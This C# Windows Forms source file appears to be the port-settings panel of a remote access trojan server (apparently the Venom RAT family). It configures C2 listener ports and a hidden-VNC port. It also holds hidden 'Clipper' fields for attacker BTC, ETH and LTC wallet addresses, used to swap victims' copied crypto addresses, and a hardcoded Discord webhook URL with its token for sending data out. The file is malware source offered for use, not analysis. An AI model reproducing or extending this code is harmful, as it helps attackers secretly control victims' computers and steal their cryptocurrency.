using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using DevExpress.Data.Mask;
using DevExpress.Utils;
using DevExpress.Utils.Svg;
using DevExpress.XtraEditors;
using DevExpress.XtraTab;
using Server.Helper;
using Server.Properties;

namespace Server.Forms;

public class FormPorts : XtraForm
{
	private static bool isOK;

	private IContainer components;

	private Label label1;

	private Label label6;

	private TextBox txtBTC;

	private Label label2;

	private TextBox txtETH;

	private Label label3;

	private TextBox txtLTC;

	private TextBox textBoxDisrordURL;

	private Label label4;

	private Label label5;

	private GroupBox groupBox2;

	private SimpleButton button1;

	private SimpleButton btnAdd;

	private SimpleButton btnDelete;

	private TextEdit textPorts;

	private TextEdit textBoxHvnc;

	private ListBoxControl listBox1;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	private Label label7;

	private SeparatorControl separatorControl1;

	private PictureBox pictureBox1;

	public FormPorts()
	{
		InitializeComponent();
		base.Opacity = 0.0;
	}

	private void PortsFrm_Load(object sender, EventArgs e)
	{
		Methods.FadeIn(this, 1);
		if (Server.Properties.Settings.Default.Ports.Length == 0)
		{
			listBox1.Items.AddRange(new object[1] { "4449" });
		}
		else
		{
			try
			{
				string[] array = Server.Properties.Settings.Default.Ports.Split(new string[1] { "," }, StringSplitOptions.None);
				foreach (string text in array)
				{
					if (!string.IsNullOrWhiteSpace(text))
					{
						listBox1.Items.Add(text.Trim());
					}
				}
			}
			catch
			{
			}
		}
		textBoxHvnc.Text = Server.Properties.Settings.Default.HVNCPort.ToString() ?? "";
		if (!string.IsNullOrEmpty(Server.Properties.Settings.Default.BtcAddr))
		{
			txtBTC.Text = Server.Properties.Settings.Default.BtcAddr;
		}
		if (!string.IsNullOrEmpty(Server.Properties.Settings.Default.EthAddr))
		{
			txtETH.Text = Server.Properties.Settings.Default.EthAddr;
		}
		if (!string.IsNullOrEmpty(Server.Properties.Settings.Default.LtcAddr))
		{
			txtLTC.Text = Server.Properties.Settings.Default.LtcAddr;
		}
		if (!string.IsNullOrEmpty(Server.Properties.Settings.Default.DiscordUrl))
		{
			textBoxDisrordURL.Text = Server.Properties.Settings.Default.DiscordUrl;
		}
		Text = Settings.Version + " | Welcome " + Environment.UserName;
		if (!File.Exists(Settings.CertificatePath))
		{
			using (FormCertificate formCertificate = new FormCertificate())
			{
				formCertificate.ShowDialog();
				return;
			}
		}
		Settings.VenomServer = new X509Certificate2(Settings.CertificatePath);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (listBox1.Items.Count <= 0)
		{
			return;
		}
		string text = "";
		foreach (string item in listBox1.Items)
		{
			text = text + item + ",";
		}
		Server.Properties.Settings.Default.Ports = text.Remove(text.Length - 1);
		Server.Properties.Settings.Default.BtcAddr = txtBTC.Text;
		Server.Properties.Settings.Default.EthAddr = txtETH.Text;
		Server.Properties.Settings.Default.LtcAddr = txtLTC.Text;
		Server.Properties.Settings.Default.DiscordUrl = textBoxDisrordURL.Text;
		Server.Properties.Settings.Default.HVNCPort = Convert.ToInt32(textBoxHvnc.Text);
		Server.Properties.Settings.Default.Save();
		isOK = true;
		Close();
	}

	private void PortsFrm_FormClosed(object sender, FormClosedEventArgs e)
	{
		if (!isOK)
		{
			Environment.Exit(0);
		}
	}

	private void BtnAdd_Click(object sender, EventArgs e)
	{
		try
		{
			Convert.ToInt32(textPorts.Text.Trim());
			listBox1.Items.Add(textPorts.Text.Trim());
			textPorts.Text = "";
		}
		catch
		{
		}
	}

	private void BtnDelete_Click(object sender, EventArgs e)
	{
		listBox1.Items.Remove(listBox1.SelectedItem);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormPorts));
		this.label1 = new System.Windows.Forms.Label();
		this.listBox1 = new DevExpress.XtraEditors.ListBoxControl();
		this.textBoxHvnc = new DevExpress.XtraEditors.TextEdit();
		this.textPorts = new DevExpress.XtraEditors.TextEdit();
		this.btnDelete = new DevExpress.XtraEditors.SimpleButton();
		this.label6 = new System.Windows.Forms.Label();
		this.btnAdd = new DevExpress.XtraEditors.SimpleButton();
		this.txtBTC = new System.Windows.Forms.TextBox();
		this.label2 = new System.Windows.Forms.Label();
		this.txtETH = new System.Windows.Forms.TextBox();
		this.label3 = new System.Windows.Forms.Label();
		this.txtLTC = new System.Windows.Forms.TextBox();
		this.textBoxDisrordURL = new System.Windows.Forms.TextBox();
		this.label4 = new System.Windows.Forms.Label();
		this.label5 = new System.Windows.Forms.Label();
		this.groupBox2 = new System.Windows.Forms.GroupBox();
		this.button1 = new DevExpress.XtraEditors.SimpleButton();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		this.separatorControl1 = new DevExpress.XtraEditors.SeparatorControl();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.label7 = new System.Windows.Forms.Label();
		((System.ComponentModel.ISupportInitialize)this.listBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.textBoxHvnc.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.textPorts.Properties).BeginInit();
		this.groupBox2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.separatorControl1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		base.SuspendLayout();
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(42, 106);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(27, 13);
		this.label1.TabIndex = 1;
		this.label1.Text = "Port";
		this.listBox1.Location = new System.Drawing.Point(271, 98);
		this.listBox1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.listBox1.Name = "listBox1";
		this.listBox1.Size = new System.Drawing.Size(163, 115);
		this.listBox1.TabIndex = 11;
		this.textBoxHvnc.Location = new System.Drawing.Point(101, 185);
		this.textBoxHvnc.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.textBoxHvnc.Name = "textBoxHvnc";
		this.textBoxHvnc.Properties.MaskSettings.Set("MaskManagerType", typeof(DevExpress.Data.Mask.NumericMaskManager));
		this.textBoxHvnc.Properties.MaskSettings.Set("MaskManagerSignature", "allowNull=False");
		this.textBoxHvnc.Properties.MaskSettings.Set("mask", "d");
		this.textBoxHvnc.Size = new System.Drawing.Size(155, 28);
		this.textBoxHvnc.TabIndex = 10;
		this.textPorts.Location = new System.Drawing.Point(101, 98);
		this.textPorts.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.textPorts.Name = "textPorts";
		this.textPorts.Properties.MaskSettings.Set("MaskManagerType", typeof(DevExpress.Data.Mask.NumericMaskManager));
		this.textPorts.Properties.MaskSettings.Set("MaskManagerSignature", "allowNull=False");
		this.textPorts.Properties.MaskSettings.Set("mask", "d");
		this.textPorts.Size = new System.Drawing.Size(155, 28);
		this.textPorts.TabIndex = 9;
		this.btnDelete.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnDelete.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnDelete.ImageOptions.SvgImage");
		this.btnDelete.Location = new System.Drawing.Point(221, 140);
		this.btnDelete.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnDelete.Name = "btnDelete";
		this.btnDelete.Size = new System.Drawing.Size(30, 28);
		this.btnDelete.TabIndex = 8;
		this.btnDelete.Text = "OK";
		this.btnDelete.Click += new System.EventHandler(BtnDelete_Click);
		this.label6.AutoSize = true;
		this.label6.Location = new System.Drawing.Point(20, 192);
		this.label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label6.Name = "label6";
		this.label6.Size = new System.Drawing.Size(57, 13);
		this.label6.TabIndex = 6;
		this.label6.Text = "HVNC Port";
		this.btnAdd.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnAdd.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnAdd.ImageOptions.SvgImage");
		this.btnAdd.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.CommonPalette;
		this.btnAdd.Location = new System.Drawing.Point(101, 140);
		this.btnAdd.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnAdd.Name = "btnAdd";
		this.btnAdd.Size = new System.Drawing.Size(30, 28);
		this.btnAdd.TabIndex = 7;
		this.btnAdd.Text = "OK";
		this.btnAdd.Click += new System.EventHandler(BtnAdd_Click);
		this.txtBTC.Location = new System.Drawing.Point(63, 29);
		this.txtBTC.Name = "txtBTC";
		this.txtBTC.Size = new System.Drawing.Size(264, 21);
		this.txtBTC.TabIndex = 0;
		this.txtBTC.Text = "--- ClipperBTC ---";
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(20, 33);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(30, 13);
		this.label2.TabIndex = 1;
		this.label2.Text = "BTC:";
		this.txtETH.Location = new System.Drawing.Point(64, 63);
		this.txtETH.Name = "txtETH";
		this.txtETH.Size = new System.Drawing.Size(264, 21);
		this.txtETH.TabIndex = 2;
		this.txtETH.Text = "--- ClipperETH ---";
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(21, 67);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(30, 13);
		this.label3.TabIndex = 3;
		this.label3.Text = "ETH:";
		this.txtLTC.Location = new System.Drawing.Point(64, 95);
		this.txtLTC.Name = "txtLTC";
		this.txtLTC.Size = new System.Drawing.Size(264, 21);
		this.txtLTC.TabIndex = 4;
		this.txtLTC.Text = "--- ClipperLTC ---";
		this.textBoxDisrordURL.Location = new System.Drawing.Point(63, 155);
		this.textBoxDisrordURL.Name = "textBoxDisrordURL";
		this.textBoxDisrordURL.Size = new System.Drawing.Size(264, 21);
		this.textBoxDisrordURL.TabIndex = 4;
		this.textBoxDisrordURL.Text = "https://discord.com/api/webhooks/1016614786533969920/fMJOOjA1pZqjV8_s0JC86KN9Fa0FeGPEHaEak8WTADC18s5Xnk3vl2YBdVD37L0qTWnM";
		this.label4.AutoSize = true;
		this.label4.Location = new System.Drawing.Point(21, 99);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(29, 13);
		this.label4.TabIndex = 5;
		this.label4.Text = "LTC:";
		this.label5.AutoSize = true;
		this.label5.Location = new System.Drawing.Point(21, 131);
		this.label5.Name = "label5";
		this.label5.Size = new System.Drawing.Size(158, 13);
		this.label5.TabIndex = 5;
		this.label5.Text = "Discord Channel WebHook URI:";
		this.groupBox2.Controls.Add(this.label5);
		this.groupBox2.Controls.Add(this.label4);
		this.groupBox2.Controls.Add(this.textBoxDisrordURL);
		this.groupBox2.Controls.Add(this.txtLTC);
		this.groupBox2.Controls.Add(this.label3);
		this.groupBox2.Controls.Add(this.txtETH);
		this.groupBox2.Controls.Add(this.label2);
		this.groupBox2.Controls.Add(this.txtBTC);
		this.groupBox2.Location = new System.Drawing.Point(403, 232);
		this.groupBox2.Name = "groupBox2";
		this.groupBox2.Size = new System.Drawing.Size(26, 33);
		this.groupBox2.TabIndex = 5;
		this.groupBox2.TabStop = false;
		this.groupBox2.Text = "Clipper Info";
		this.groupBox2.Visible = false;
		this.button1.Location = new System.Drawing.Point(11, 309);
		this.button1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(465, 29);
		this.button1.TabIndex = 6;
		this.button1.Text = "Start";
		this.button1.Click += new System.EventHandler(button1_Click);
		this.xtraTabControl1.Location = new System.Drawing.Point(12, 8);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(465, 291);
		this.xtraTabControl1.TabIndex = 7;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.label7);
		this.xtraTabPage1.Controls.Add(this.separatorControl1);
		this.xtraTabPage1.Controls.Add(this.pictureBox1);
		this.xtraTabPage1.Controls.Add(this.listBox1);
		this.xtraTabPage1.Controls.Add(this.textPorts);
		this.xtraTabPage1.Controls.Add(this.textBoxHvnc);
		this.xtraTabPage1.Controls.Add(this.label1);
		this.xtraTabPage1.Controls.Add(this.btnAdd);
		this.xtraTabPage1.Controls.Add(this.btnDelete);
		this.xtraTabPage1.Controls.Add(this.label6);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(463, 260);
		this.xtraTabPage1.Text = "Settings";
		this.separatorControl1.Dock = System.Windows.Forms.DockStyle.Top;
		this.separatorControl1.LineColor = System.Drawing.Color.FromArgb(1, 163, 1);
		this.separatorControl1.Location = new System.Drawing.Point(0, 61);
		this.separatorControl1.Name = "separatorControl1";
		this.separatorControl1.Size = new System.Drawing.Size(463, 19);
		this.separatorControl1.TabIndex = 175;
		this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
		this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Top;
		this.pictureBox1.ErrorImage = null;
		this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		this.pictureBox1.InitialImage = null;
		this.pictureBox1.Location = new System.Drawing.Point(0, 0);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(463, 61);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.pictureBox1.TabIndex = 174;
		this.pictureBox1.TabStop = false;
		this.label7.AutoSize = true;
		this.label7.Location = new System.Drawing.Point(100, 218);
		this.label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label7.Name = "label7";
		this.label7.Size = new System.Drawing.Size(123, 13);
		this.label7.TabIndex = 176;
		this.label7.Text = "Don't change HVNC port";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(488, 345);
		base.Controls.Add(this.xtraTabControl1);
		base.Controls.Add(this.button1);
		base.Controls.Add(this.groupBox2);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormPorts.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormPorts.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.MaximizeBox = false;
		this.MaximumSize = new System.Drawing.Size(490, 379);
		base.MinimizeBox = false;
		this.MinimumSize = new System.Drawing.Size(490, 379);
		base.Name = "FormPorts";
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Settings Ports";
		base.TopMost = true;
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(PortsFrm_FormClosed);
		base.Load += new System.EventHandler(PortsFrm_Load);
		((System.ComponentModel.ISupportInitialize)this.listBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.textBoxHvnc.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.textPorts.Properties).EndInit();
		this.groupBox2.ResumeLayout(false);
		this.groupBox2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		this.xtraTabPage1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.separatorControl1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		base.ResumeLayout(false);
	}
}
